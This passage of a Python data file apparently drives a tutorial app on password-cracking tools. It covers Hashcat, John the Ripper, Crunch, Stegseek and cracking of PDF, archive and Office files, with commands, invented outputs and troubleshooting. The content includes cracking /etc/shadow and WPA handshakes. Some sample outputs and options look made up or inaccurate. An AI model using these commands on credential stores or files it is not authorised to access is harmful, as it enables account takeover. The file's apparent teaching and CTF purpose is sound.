NSE: 'ssh-brute' threw a runtime error: /usr/share/nmap/scripts/ssh-brute.nse:127:
     attempt to index global 'brute' (a nil value)

⚠️ Fixes:
  • sudo apt update && sudo apt install nmap-common
  • Verify script exists: ls /usr/share/nmap/scripts/ | grep brute
  • Update Nmap: sudo apt upgrade nmap"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Target Enum", "desc": "Nmap finds SSH open on port 22", "from": "Attacker", "to": "Target", "data": "Port 22 open", "color": "#3498db"},
            {"step": 2, "title": "Load NSE Script", "desc": "Nmap loads ssh-brute NSE script", "from": "Nmap", "to": "NSE Engine", "data": "ssh-brute.nse", "color": "#f39c12"},
            {"step": 3, "title": "Brute Force Loop", "desc": "Tries credentials from userdb + passdb", "from": "NSE", "to": "SSH Server", "data": "156 guesses", "color": "#9b59b6"},
            {"step": 4, "title": "Found Valid Creds", "desc": "Reports admin:password123", "from": "SSH Server", "to": "Attacker", "data": "admin:password123 ✓", "color": "#27ae60"}
        ]
    }
]
# ==================== OFFLINE BRUTE FORCE TOOLS ====================
OFFLINE_TOOLS = [
    # ---------- HASH CRACKERS ----------
    {
        "id": "john",
        "name": "John the Ripper",
        "icon": "🔓",
        "color": "#27ae60",
        "tagline": "The Legendary Password Cracker",
        "description": "John the Ripper is a fast password cracker that supports hundreds of hash types — Linux/Windows hashes, ZIP/RAR/PDF passwords, and more.",
        "install": "sudo apt install john",
        "difficulty": "Beginner",
        "speed": "Fast (CPU)",
        "category": "Hash Cracking",
        "common_flags": [
            {"flag": "--wordlist=", "desc": "Dictionary attack with wordlist"},
            {"flag": "--format=", "desc": "Specify hash type"},
            {"flag": "--single", "desc": "Single crack mode"},
            {"flag": "--rules", "desc": "Apply mangling rules"},
            {"flag": "--show", "desc": "Show cracked passwords"},
            {"flag": "--list=formats", "desc": "List all supported formats"}
        ],
        "examples": [
            {
                "title": "Basic Hash Cracking",
                "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
                "explanation": "Tries each word in rockyou.txt. John auto-detects hash format.",
                "output": """Loaded 3 password hashes with 3 different salts
password123      (admin)
letmein          (user1)
toor             (root)
3g 0:00:00:12 DONE"""
            },
            {
                "title": "Linux Shadow File",
                "command": "unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt",
                "explanation": "Merges passwd + shadow, then cracks Linux password hashes.",
                "output": """Loaded 5 password hashes (sha512crypt)
password         (john)
Password123      (admin)
3g 0:00:02:34 DONE"""
            },
            {
                "title": "Single Crack Mode",
                "command": "john --single --format=raw-md5 hash.txt",
                "explanation": "Uses username/GECOS info to guess passwords. Great for CTFs.",
                "output": """Loaded 1 password hash (Raw-MD5)
Jok3r            (joker)
1g 0:00:00:00 DONE"""
            }
        ],
        "failures": [
            {
                "title": "No Password Cracked (Exhausted Wordlist)",
                "command": "john --wordlist=rockyou.txt hashes.txt",
                "explanation": "Password isn't in the wordlist. John runs through all entries and cracks nothing.",
                "output": """Loaded 3 password hashes with 3 different salts
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:02:45:23 DONE (2024-01-15 17:23) 0g/s 8500Kp/s
Session completed

0 password hashes cracked, 3 left

⚠️ Why this happens:
  • Password is complex (not in rockyou.txt)
  • Try: --rules (mangling), --incremental (brute force)
  • Combine wordlists with custom mangling rules
  • Try john --show to verify nothing was cracked"""
            },
            {
                "title": "Unrecognized Hash Format",
                "command": "john --wordlist=rockyou.txt hashes.txt",
                "explanation": "John can't detect the hash type.",
                "output": """No password hashes loaded (see FAQ)

⚠️ John couldn't auto-detect the hash format!
   Fixes:
   • Use --format= to specify manually:
     john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
   • Check available formats:
     john --list=formats
   • Verify hash isn't corrupted"""
            },
            {
                "title": "Wrong Hash Type Specified",
                "command": "john --format=raw-sha256 --wordlist=rockyou.txt md5_hashes.txt",
                "explanation": "You told John the hash is SHA256 but the file contains MD5. Nothing will ever match.",
                "output": """Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (Raw-SHA256)
Press 'q' or Ctrl-C to abort
0g 0:05:23:12 DONE 0g/s 12500Kp/s
Session completed

0 password hashes cracked, 3 left

⚠️ Hash mismatch!
   The file hashes.txt contains MD5 hashes but you used --format=raw-sha256
   Correct: john --format=raw-md5 --wordlist=rockyou.txt hashes.txt"""
            },
            {
                "title": "Wordlist File Not Found",
                "command": "john --wordlist=/path/to/nonexistent.txt hashes.txt",
                "explanation": "The wordlist path is wrong.",
                "output": """Could not open the wordlist file: /path/to/nonexistent.txt
stat: No such file or directory

⚠️ Verify wordlist exists:
   ls -la /usr/share/wordlists/rockyou.txt
   locate rockyou.txt
   find / -name "rockyou.txt" 2>/dev/null"""
            },
            {
                "title": "Permission Denied on Hash File",
                "command": "john --wordlist=rockyou.txt /etc/shadow",
                "explanation": "You need root to read shadow file directly.",
                "output": """Could not open the file: /etc/shadow (Permission denied)
Please run John as root or use unshadow first.

⚠️ Fixes:
   sudo john --wordlist=rockyou.txt /etc/shadow
   OR:
   sudo unshadow /etc/passwd /etc/shadow > combined.txt
   john --wordlist=rockyou.txt combined.txt"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Load Hash File", "desc": "John reads hashes.txt and detects format", "from": "Attacker", "to": "John", "data": "3 hashes loaded", "color": "#27ae60"},
            {"step": 2, "title": "Load Wordlist", "desc": "Reads rockyou.txt (14M passwords)", "from": "John", "to": "Memory", "data": "rockyou.txt ready", "color": "#3498db"},
            {"step": 3, "title": "Hash Each Guess", "desc": "Hashes each word and compares", "from": "John", "to": "CPU", "data": "MD5(word) == target?", "color": "#f39c12"},
            {"step": 4, "title": "Match Found", "desc": "Password 'password123' hashes to target", "from": "John", "to": "Output", "data": "password123 ✓", "color": "#27ae60"}
        ]
    },
    {
        "id": "hashcat",
        "name": "Hashcat",
        "icon": "⚡",
        "color": "#e74c3c",
        "tagline": "GPU-Accelerated Hash Cracking",
        "description": "World's fastest password recovery tool. Uses GPU to crack at millions of attempts per second. 300+ hash types supported.",
        "install": "sudo apt install hashcat",
        "difficulty": "Intermediate",
        "speed": "Extreme (GPU)",
        "category": "Hash Cracking",
        "common_flags": [
            {"flag": "-m", "desc": "Hash type (0=MD5, 100=SHA1, 22000=WPA)"},
            {"flag": "-a", "desc": "Attack mode (0=dict, 3=brute, 6=hybrid)"},
            {"flag": "--show", "desc": "Show cracked hashes"},
            {"flag": "-r", "desc": "Rule file"},
            {"flag": "-o", "desc": "Output file"},
            {"flag": "--force", "desc": "Ignore warnings"}
        ],
        "examples": [
            {
                "title": "MD5 Hash Cracking",
                "command": "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
                "explanation": "`-m 0` = MD5, `-a 0` = dictionary attack. GPU makes it 100x faster than CPU.",
                "output": """Status...........: Cracked
Hash.Mode........: 0 (MD5)
Recovered........: 2/2 Digests
5f4dcc3b5aa765d61d8327deb882cf99:password
e10adc3949ba59abbe56e057f20f883e:123456
Speed.#1.........:  15234.5 MH/s"""
            },
            {
                "title": "WPA Handshake",
                "command": "hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt",
                "explanation": "`-m 22000` = WPA-PBKDF2. Convert .cap with hcxpcapngtool first.",
                "output": """Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Candidates.#1....: mywifi123 -> mywifi123
Speed.#1.........:    95000 H/s"""
            },
            {
                "title": "Hybrid Attack",
                "command": "hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d",
                "explanation": "`-a 6` = hybrid. Appends two digits to each wordlist entry.",
                "output": """Status...........: Cracked
Candidates.#1....: password12 -> password12"""
            }
        ],
        "failures": [
            {
                "title": "Exhausted — Not Cracked",
                "command": "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
                "explanation": "Rockyou exhausted, hash not matched.",
                "output": """Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Recovered........: 0/3 (0.00%) Digests
Progress.........: 14344391/14344391 (100.00%)
Rejected.........: 0/14344391
Restore.Point....: 14344391/14344391 (100.00%)
Time.Started.....: Mon Jan 15 14:23:00 2024
Time.Estimated...: Mon Jan 15 14:25:45 2024
Speed.#1.........:  15234.5 MH/s
Recovered........: 0/3

⚠️ No hash cracked!
   Try:
   • Add mangling rules: -r /usr/share/hashcat/rules/best64.rule
   • Use mask attack: -a 3 ?a?a?a?a?a?a
   • Try combinator attack: -a 1 wordlist1.txt wordlist2.txt
   • Larger wordlist (SecLists)"""
            },
            {
                "title": "No OpenCL Devices Found",
                "command": "hashcat -m 0 hashes.txt rockyou.txt",
                "explanation": "No GPU or missing drivers.",
                "output": """hashcat (v6.2.6) starting in backend information mode

OpenCL Info:
============
ERROR: No devices found

⚠️ Fixes:
  • Install GPU drivers: sudo apt install nvidia-driver-535
  • Or use CPU mode: hashcat --force -m 0 -a 0 hashes.txt rockyou.txt
  • Or install pocl-opencl-icd for CPU fallback: sudo apt install pocl-opencl-icd"""
            },
            {
                "title": "Wrong Hash Mode",
                "command": "hashcat -m 1000 hashes.txt rockyou.txt",
                "explanation": "You specified NTLM (-m 1000) but the hashes are MD5. Nothing will ever match.",
                "output": """Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Recovered........: 0/2 (0.00%) Digests
Progress.........: 14344391/14344391 (100.00%)
Time.Started.....: Mon Jan 15 14:23:00 2024
Time.Estimated...: Mon Jan 15 14:25:45 2024

⚠️ Mode mismatch!
   The hashes look like MD5 (32 hex chars), but you used -m 1000 (NTLM).
   Correct: hashcat -m 0 hashes.txt rockyou.txt
   Tip: Use hashcat --identify hashes.txt"""
            },
            {
                "title": "Line-Length Exception / Malformed Hash",
                "command": "hashcat -m 0 hashes.txt rockyou.txt",
                "explanation": "One hash in the file is corrupted or wrong length.",
                "output": """Hashfile 'hashes.txt' on line 3 (abc123notavalidhash):
Line-length exception
No hashes loaded.

⚠️ Fix:
  • Every MD5 hash must be exactly 32 hex chars
  • Clean the file: grep -E '^[a-f0-9]{32}$' hashes.txt > clean.txt
  • Remove empty lines and comments"""
            },
            {
                "title": "Out of Memory (Large Wordlist)",
                "command": "hashcat -m 22000 capture.hc22000 huge_wordlist.txt",
                "explanation": "WPA hashing requires 4096 iterations per guess — memory fills up.",
                "output": """Status...........: Exhausted
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
ERROR: Out of memory during dictionary load
Recovered........: 0/1 (0.00%) Digests

⚠️ Fixes:
  • Reduce wordlist size: head -n 1000000 huge_wordlist.txt > small.txt
  • Increase memory: hashcat -m 22000 -w 2 (workload profile)
  • Use --wordlist-auto-hexlen= to reduce memory footprint"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Detect GPU", "desc": "Hashcat initializes OpenCL/CUDA device", "from": "Attacker", "to": "GPU", "data": "RTX 4090 detected", "color": "#e74c3c"},
            {"step": 2, "title": "Load Hash", "desc": "Reads hashes.txt, mode 0 = MD5", "from": "Hashcat", "to": "Memory", "data": "5f4dcc3b...", "color": "#3498db"},
            {"step": 3, "title": "Mass Parallel", "desc": "GPU tries 15 BILLION hashes per second", "from": "GPU", "to": "Hash Compare", "data": "15.2 GH/s", "color": "#f39c12"},
            {"step": 4, "title": "Instant Crack", "desc": "Rockyou.txt cracked in under 1 second", "from": "GPU", "to": "Output", "data": "password ✓", "color": "#27ae60"}
        ]
    },
    # ---------- WORDLIST GENERATORS ----------
    {
        "id": "crunch",
        "name": "Crunch",
        "icon": "📋",
        "color": "#f39c12",
        "tagline": "Custom Wordlist Generator",
        "description": "Crunch generates custom wordlists based on character sets, patterns, and length ranges. Perfect for targeted attacks.",
        "install": "sudo apt install crunch",
        "difficulty": "Beginner",
        "speed": "N/A (generator)",
        "category": "Wordlist Generation",
        "common_flags": [
            {"flag": "-t", "desc": "Pattern (@=lower, ,=upper, %=num, ^=sym)"},
            {"flag": "-o", "desc": "Output file"},
            {"flag": "-b", "desc": "Split output into pieces"},
            {"flag": "-c", "desc": "Lines per file"},
            {"flag": "-p", "desc": "Permute words"},
            {"flag": "-f", "desc": "Use charset file"}
        ],
        "examples": [
            {
                "title": "Numeric PINs",
                "command": "crunch 3 4 0123456789 -o pins.txt",
                "explanation": "All 3-4 digit numbers (000-9999).",
                "output": """11000 lines generated
crunch: 100% completed"""
            },
            {
                "title": "Name + Year Pattern",
                "command": "crunch 8 8 -t john%%%% -o john_years.txt",
                "explanation": "'john' + 4 digits (john0000 → john9999).",
                "output": """john0000
john0001
...
john9999
10000 lines generated"""
            },
            {
                "title": "Corporate Policy",
                "command": "crunch 8 12 'abcdefghijklmnopqrstuvwxyzABC...!@#$%^&*()' -o corp.txt",
                "explanation": "Matches corporate password policy: 8-12 chars, all types.",
                "output": """Warning: 4.3e+26 lines
Consider using -b to split"""
            }
        ],
        "failures": [
            {
                "title": "Disk Full — Wordlist Too Large",
                "command": "crunch 10 10 abcdefghijklmnopqrstuvwxyz0123456789 -o huge.txt",
                "explanation": "Trying to generate a wordlist larger than available disk space.",
                "output": """Crunch will now generate the following amount of data: 3656158440062976 bytes
3483918 MB
3402 GB
3 TB
0 PB

Crunch will now generate the following number of lines: 3656158440062976

Error: Disk space insufficient
Available: 45 GB
Required:  3402 GB

⚠️ Fixes:
  • Use -b to split output into smaller files
    crunch 10 10 abc -b 1mb -o START
  • Reduce character set or length
  • Use a pattern (-t) to limit combinations"""
            },
            {
                "title": "Invalid Pattern Symbol",
                "command": "crunch 8 8 -t johnZZZZ -o out.txt",
                "explanation": "Pattern uses invalid placeholder characters.",
                "output": """Crunch error: Invalid character 'Z' in pattern
Valid pattern symbols:
  @ = lowercase letters (a-z)
  , = uppercase letters (A-Z)
  % = numbers (0-9)
  ^ = symbols (!@#$%^&*)

⚠️ Correct syntax:
  crunch 8 8 -t john%%%% -o out.txt    # john0000-john9999
  crunch 8 8 -t @@%%%%%% -o out.txt    # aa000000-zz999999"""
            },
            {
                "title": "Charset File Not Found",
                "command": "crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha -o out.txt",
                "explanation": "The charset.lst file is missing or has wrong path.",
                "output": """Error: Could not open charset file: /usr/share/crunch/charset.lst

⚠️ Fixes:
  • sudo apt install crunch    (reinstalls charset.lst)
  • Check path: ls /usr/share/crunch/
  • Or specify charset directly on command line"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Define Charset", "desc": "User specifies chars + length range", "from": "User", "to": "Crunch", "data": "charset + min/max", "color": "#f39c12"},
            {"step": 2, "title": "Calculate Combos", "desc": "Crunch computes total combinations", "from": "Crunch", "to": "Math", "data": "62^8 = 2.1e+14", "color": "#3498db"},
            {"step": 3, "title": "Generate", "desc": "Iterates through each combination", "from": "Crunch", "to": "File", "data": "aaaa0000, aaaa0001...", "color": "#9b59b6"},
            {"step": 4, "title": "Wordlist Ready", "desc": "custom.txt saved for later cracking", "from": "Crunch", "to": "Output", "data": "custom.txt ✓", "color": "#27ae60"}
        ]
    },
    # ---------- STEGANOGRAPHY ----------
    {
        "id": "stegseek",
        "name": "Stegseek",
        "icon": "🖼️",
        "color": "#9b59b6",
        "tagline": "Lightning-Fast Steghide Cracker",
        "description": "Stegseek runs through rockyou.txt in under 2 seconds. Extracts hidden data from JPEG/BMP/WAV files protected with steghide.",
        "install": "Download .deb from GitHub",
        "difficulty": "Beginner",
        "speed": "Extreme",
        "category": "Steganography",
        "common_flags": [
            {"flag": "--crack", "desc": "Crack with wordlist (default)"},
            {"flag": "--seed", "desc": "Extract without password"},
            {"flag": "-sf", "desc": "Stego file"},
            {"flag": "-wl", "desc": "Wordlist"},
            {"flag": "-xf", "desc": "Output file"}
        ],
        "examples": [
            {
                "title": "Basic Wordlist Crack",
                "command": "stegseek image.jpg /usr/share/wordlists/rockyou.txt",
                "explanation": "Tries each password against the steghide-protected image.",
                "output": """StegSeek 0.6

[i] Found passphrase: "iloveu"
[i] Original filename: "flag.txt".
[i] Extracting to "image.jpg.out"."""
            },
            {
                "title": "Seed Crack (No Password)",
                "command": "stegseek --seed suspicious.jpg",
                "explanation": "Brute-forces RNG seed. Works if data was embedded without encryption.",
                "output": """[i] Checking if file contains steghide data...
[i] File contains unencrypted data!
[i] Extracting to "suspicious.jpg.out"."""
            }
        ],
        "failures": [
            {
                "title": "No Steghide Data Found",
                "command": "stegseek image.jpg rockyou.txt",
                "explanation": "The image doesn't contain steghide-embedded data at all.",
                "output": """StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Trying to crack stego image: image.jpg
[i] Using wordlist: rockyou.txt
[i] Loaded 14344391 words
[!] No passphrase found after 14344391 tries
[!] This file does not appear to contain steghide data

⚠️ Possible reasons:
  • Not a steghide file — try other tools:
    binwalk, foremost, zsteg, outguess, openstego
  • Data embedded by different tool (check file metadata)
  • Try: stegseek --seed image.jpg"""
            },
            {
                "title": "Unsupported File Format",
                "command": "stegseek image.png rockyou.txt",
                "explanation": "Steghide only supports JPEG, BMP, WAV, AU.",
                "output": """StegSeek 0.6

[!] Unsupported file format: image.png
[!] Steghide supports: JPEG, BMP, WAV, AU

⚠️ Convert or use different tool:
  • Convert PNG → JPG: convert image.png image.jpg
  • For PNG stego use: zsteg, stegsolve, pngcheck"""
            },
            {
                "title": "Corrupted Image File",
                "command": "stegseek corrupt.jpg rockyou.txt",
                "explanation": "Image file is damaged and can't be parsed.",
                "output": """StegSeek 0.6

[!] Failed to open file: corrupt.jpg
[!] Error: Invalid JPEG marker

⚠️ Verify image integrity:
  file corrupt.jpg
  identify corrupt.jpg    (ImageMagick)
  Try re-downloading the image"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Read Image", "desc": "Loads JPEG and reads pixels", "from": "Attacker", "to": "Stegseek", "data": "image.jpg loaded", "color": "#9b59b6"},
            {"step": 2, "title": "Try Password", "desc": "Calls steghide with each word", "from": "Stegseek", "to": "steghide", "data": "'hello' - wrong", "color": "#3498db"},
            {"step": 3, "title": "Password Matches", "desc": "'iloveu' successfully extracts data", "from": "steghide", "to": "Stegseek", "data": "iloveu ✓", "color": "#27ae60"},
            {"step": 4, "title": "Extract File", "desc": "Writes hidden 'flag.txt' to disk", "from": "Stegseek", "to": "Output", "data": "image.jpg.out", "color": "#f39c12"}
        ]
    },
    {
        "id": "stegcracker",
        "name": "StegCracker",
        "icon": "🕵️",
        "color": "#16a085",
        "tagline": "Alternative Steghide Cracker",
        "description": "Python-based alternative to Stegseek. Uses steghide with multiprocessing for speed.",
        "install": "pip3 install stegcracker",
        "difficulty": "Beginner",
        "speed": "Fast",
        "category": "Steganography",
        "common_flags": [
            {"flag": "wordlist", "desc": "Positional wordlist argument"},
            {"flag": "-t", "desc": "Threads"},
            {"flag": "-o", "desc": "Output file"}
        ],
        "examples": [
            {
                "title": "Basic Attack",
                "command": "stegcracker image.jpg /usr/share/wordlists/rockyou.txt",
                "explanation": "Tries each word in rockyou.txt against steghide.",
                "output": """StegCracker 2.1.1
Attempting to crack: image.jpg
Passphrase: iloveu
Found! Data written to: image.jpg.out"""
            }
        ],
        "failures": [
            {
                "title": "No Passphrase Found",
                "command": "stegcracker image.jpg rockyou.txt",
                "explanation": "No wordlist entry matched the stego password.",
                "output": """StegCracker 2.1.1
Attempting to crack: image.jpg
Wordlist: rockyou.txt (14344391 words)

Passphrase not found in wordlist

⚠️ Try:
  • Larger wordlist (SecLists)
  • stegseek (much faster)
  • Verify file really contains steghide data:
    steghide info image.jpg"""
            },
            {
                "title": "Steghide Not Installed",
                "command": "stegcracker image.jpg rockyou.txt",
                "explanation": "StegCracker depends on steghide — it must be installed.",
                "output": """StegCracker 2.1.1
ERROR: steghide is not installed or not in PATH

⚠️ Fix:
  sudo apt install steghide
  which steghide    # verify"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Load Image", "desc": "Reads target image", "from": "Attacker", "to": "StegCracker", "data": "image.jpg", "color": "#16a085"},
            {"step": 2, "title": "Spawn Workers", "desc": "Runs multiple steghide processes", "from": "StegCracker", "to": "Workers", "data": "4 threads", "color": "#3498db"},
            {"step": 3, "title": "Match Found", "desc": "Thread hits valid password", "from": "Worker", "to": "StegCracker", "data": "iloveu ✓", "color": "#27ae60"}
        ]
    },
    # ---------- PDF ----------
    {
        "id": "pdf_crack",
        "name": "PDF Password Cracking",
        "icon": "📄",
        "color": "#e67e22",
        "tagline": "Encrypted PDF Recovery",
        "description": "Crack encrypted PDFs using pdfcrack, John, or Hashcat. Handles user passwords (open) and owner passwords (permissions).",
        "install": "sudo apt install pdfcrack john hashcat",
        "difficulty": "Beginner",
        "speed": "Fast",
        "category": "File Cracking",
        "common_flags": [
            {"flag": "pdf2john", "desc": "Extract PDF hash"},
            {"flag": "-f", "desc": "pdfcrack: PDF file"},
            {"flag": "-w", "desc": "pdfcrack: wordlist"},
            {"flag": "-c", "desc": "pdfcrack: charset"},
            {"flag": "-n", "desc": "Min length"},
            {"flag": "-m", "desc": "Max length"}
        ],
        "examples": [
            {
                "title": "PDF Crack with pdfcrack",
                "command": "pdfcrack -f encrypted.pdf -w /usr/share/wordlists/rockyou.txt",
                "explanation": "Native PDF cracker. Fast for standard encryption.",
                "output": """PDFCrack - Version 0.20
Starting pdfcrack...
Found user-password: 'secret123'

Time taken: 00:00:15"""
            },
            {
                "title": "PDF Crack with John",
                "command": "pdf2john encrypted.pdf > pdf_hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt",
                "explanation": "Extract hash with pdf2john, crack with John.",
                "output": """Loaded 1 password hash ($pdf$2*3*128*...)
mypassword       (encrypted.pdf)
1g 0:00:00:08 DONE"""
            }
        ],
        "failures": [
            {
                "title": "PDF Is Not Encrypted",
                "command": "pdfcrack -f normal.pdf -w rockyou.txt",
                "explanation": "The PDF isn't password-protected — nothing to crack.",
                "output": """PDFCrack - Version 0.20
Starting pdfcrack...
Error: PDF file is not encrypted

⚠️ Verify:
  pdfinfo normal.pdf
  Look for 'Encrypted: no'"""
            },
            {
                "title": "Password Not Found",
                "command": "pdfcrack -f encrypted.pdf -w rockyou.txt",
                "explanation": "The password isn't in the wordlist.",
                "output": """PDFCrack - Version 0.20
Starting pdfcrack...
Loaded 14344391 passwords from rockyou.txt
Progress: 14344391/14344391 (100%)

Password not found!

⚠️ Try:
  • Larger wordlist (SecLists)
  • Brute force: pdfcrack -f file.pdf -c 0123456789abcdef -n 6 -m 8
  • Try John: pdf2john encrypted.pdf > hash.txt
              john --wordlist=rockyou.txt hash.txt"""
            },
            {
                "title": "Corrupted PDF File",
                "command": "pdfcrack -f corrupt.pdf -w rockyou.txt",
                "explanation": "PDF is damaged or not a valid PDF.",
                "output": """PDFCrack - Version 0.20
Error: Unable to open file 'corrupt.pdf'
Error: Not a valid PDF document

⚠️ Check file type:
  file corrupt.pdf
  head -c 20 corrupt.pdf    # should show: %PDF-1.x"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Load PDF", "desc": "Reads encrypted.pdf", "from": "Attacker", "to": "pdfcrack", "data": "encrypted.pdf", "color": "#e67e22"},
            {"step": 2, "title": "Extract Hash", "desc": "pdf2john extracts the password hash", "from": "pdfcrack", "to": "Hash", "data": "$pdf$2*3*128*...", "color": "#3498db"},
            {"step": 3, "title": "Try Passwords", "desc": "Compares each wordlist entry", "from": "pdfcrack", "to": "Hash", "data": "15 attempts/sec", "color": "#f39c12"},
            {"step": 4, "title": "Success", "desc": "Found 'secret123' — PDF opens", "from": "pdfcrack", "to": "Output", "data": "secret123 ✓", "color": "#27ae60"}
        ]
    },
    # ---------- ZIP / RAR / 7z ----------
    {
        "id": "zip_crack",
        "name": "ZIP / RAR / 7z Cracking",
        "icon": "🗜️",
        "color": "#c0392b",
        "tagline": "Archive Password Recovery",
        "description": "Extract hashes from ZIP, RAR, 7z archives, then crack with John or Hashcat. Different archives require different hash extractors.",
        "install": "sudo apt install fcrackzip john hashcat unrar p7zip-full",
        "difficulty": "Beginner",
        "speed": "Fast",
        "category": "File Cracking",
        "common_flags": [
            {"flag": "zip2john", "desc": "Extract hash from ZIP"},
            {"flag": "rar2john", "desc": "Extract hash from RAR"},
            {"flag": "7z2john", "desc": "Extract hash from 7z"},
            {"flag": "fcrackzip -u", "desc": "Native ZIP cracker"},
            {"flag": "-D", "desc": "fcrackzip: dictionary mode"}
        ],
        "examples": [
            {
                "title": "ZIP Crack with John",
                "command": "zip2john protected.zip > zip_hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt",
                "explanation": "Extracts ZIP hash then cracks with John.",
                "output": """Loaded 1 password hash (PKZIP)
secret123        (protected.zip)
1g 0:00:00:05 DONE"""
            },
            {
                "title": "ZIP Crack with fcrackzip (Fast)",
                "command": "fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt protected.zip",
                "explanation": "Native cracker, faster than John for ZipCrypto.",
                "output": """PASSWORD FOUND!!!!: pw == secret123"""
            },
            {
                "title": "RAR Crack",
                "command": "rar2john protected.rar > rar_hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt",
                "explanation": "Extracts RAR hash, cracks with John.",
                "output": """Loaded 1 password hash (RAR5)
mypass2024       (protected.rar)
1g 0:00:00:34 DONE"""
            },
            {
                "title": "7z Crack",
                "command": "7z2john protected.7z > 7z_hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt 7z_hash.txt",
                "explanation": "Extracts 7z hash. Requires p7zip-full.",
                "output": """Loaded 1 password hash (7z)
secret           (protected.7z)
1g 0:00:00:18 DONE"""
            }
        ],
        "failures": [
            {
                "title": "Archive Not Encrypted",
                "command": "zip2john normal.zip > hash.txt",
                "explanation": "The archive has no password — nothing to crack.",
                "output": """ver 2.0 efh 5455 efh 7875 normal.txt PKZIP Encr: 2b chk, TS_chk, cmplen=17, decmplen=5, crc=B2B2D26C

0 password hashes loaded

⚠️ Archive has no password protection!

⚠️ Verify:
  unzip -l normal.zip    # if this lists files without asking for password, it's not encrypted"""
            },
            {
                "title": "Password Not Found in Wordlist",
                "command": "john --wordlist=rockyou.txt zip_hash.txt",
                "explanation": "Rockyou exhausted, password not matched.",
                "output": """Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort
0g 0:15:23:45 DONE (2024-01-16 06:46) 0g/s 8500Kp/s
Session completed

0 password hashes cracked, 1 left

⚠️ Try:
  • Larger wordlist (SecLists)
  • Hashcat with rules: hashcat -m 17200 -r best64.rule zip_hash.txt rockyou.txt
  • Mask attack for known pattern"""
            },
            {
                "title": "RAR Extraction Failed — Wrong Tool",
                "command": "zip2john protected.rar > hash.txt",
                "explanation": "You used zip2john on a RAR file.",
                "output": """ver 2.0 efh 5455 efh 7875 protected.rar PKZIP Encr: 2b chk, TS_chk, cmplen=17, decmplen=5, crc=B2B2D26C

ERROR: No valid ZIP signature found

⚠️ Wrong extractor for this file type!
  RAR files:  rar2john protected.rar > hash.txt
  7z files:   7z2john protected.7z > hash.txt
  ZIP files:  zip2john protected.zip > hash.txt

  Verify: file protected.rar"""
            },
            {
                "title": "Missing unrar / p7zip Package",
                "command": "rar2john protected.rar > hash.txt",
                "explanation": "The extraction tools need unrar and p7zip installed.",
                "output": """/usr/share/john/rar2john.py: cannot find rar2john binary
ERROR: unrar: command not found

⚠️ Install required packages:
  sudo apt install unrar p7zip-full
  which unrar unrar-free 7z"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Load Archive", "desc": "Reads protected.zip", "from": "Attacker", "to": "zip2john", "data": "protected.zip", "color": "#c0392b"},
            {"step": 2, "title": "Extract Hash", "desc": "Converts ZIP header to crackable hash", "from": "zip2john", "to": "Hash", "data": "$pkzip2$*0*...", "color": "#3498db"},
            {"step": 3, "title": "Dictionary Attack", "desc": "John/Hashcat tries each wordlist entry", "from": "John", "to": "Hash", "data": "Try 'secret123'", "color": "#f39c12"},
            {"step": 4, "title": "Extract Files", "desc": "Password found — unzip the archive", "from": "Attacker", "to": "Files", "data": "secret123 ✓", "color": "#27ae60"}
        ]
    },
    # ---------- OFFICE ----------
    {
        "id": "office_crack",
        "name": "Office Document Cracking",
        "icon": "📊",
        "color": "#2980b9",
        "tagline": "Word, Excel, PowerPoint Recovery",
        "description": "Office documents (DOCX, XLSX, PPTX) and legacy formats (DOC, XLS) can be password protected. office2john extracts the hash for cracking.",
        "install": "sudo apt install john hashcat",
        "difficulty": "Beginner",
        "speed": "Fast",
        "category": "File Cracking",
        "common_flags": [
            {"flag": "office2john", "desc": "Modern Office files"},
            {"flag": "oldoffice2john", "desc": "Legacy .doc/.xls"},
            {"flag": "-m 9600", "desc": "Hashcat: MS Office 2013+"},
            {"flag": "-m 9400", "desc": "Hashcat: MS Office 2007"}
        ],
        "examples": [
            {
                "title": "DOCX Crack",
                "command": "office2john protected.docx > docx_hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt docx_hash.txt",
                "explanation": "Extracts hash from DOCX, cracks with John.",
                "output": """Loaded 1 password hash (Office [2013])
company2024      (protected.docx)
1g 0:00:00:22 DONE"""
            },
            {
                "title": "XLSX with Hashcat",
                "command": "office2john protected.xlsx > xlsx_hash.txt\nhashcat -m 9600 xlsx_hash.txt /usr/share/wordlists/rockyou.txt",
                "explanation": "`-m 9600` = MS Office 2013+ (SHA512 + AES).",
                "output": """Status...........: Cracked
Hash.Mode........: 9600 (MS Office 2013)
Candidates.#1....: excel123 -> excel123"""
            }
        ],
        "failures": [
            {
                "title": "Document Not Password Protected",
                "command": "office2john normal.docx > hash.txt",
                "explanation": "Document isn't encrypted.",
                "output": """normal.docx:$office$*2013*100000*256*16*...*...

0 password hashes loaded

